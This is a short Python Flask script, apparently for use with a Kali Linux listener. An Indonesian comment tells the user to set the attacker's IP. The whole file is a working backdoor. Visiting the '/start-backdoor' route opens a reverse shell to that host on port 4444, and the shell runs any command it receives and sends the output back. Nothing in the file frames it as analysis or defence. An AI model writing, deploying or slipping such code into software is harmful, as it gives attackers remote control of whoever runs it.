from flask import Flask
import socket
import subprocess
import threading

app = Flask(__name__)

KALI_IP = '127.0.0.1'  # Ganti dengan IP Kali Linux kamu
KALI_PORT = 4444

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((KALI_IP, KALI_PORT))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())

    s.close()

@app.route('/start-backdoor')
def start_backdoor():
    thread = threading.Thread(target=reverse_shell)
    thread.start()
    return "Backdoor started!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
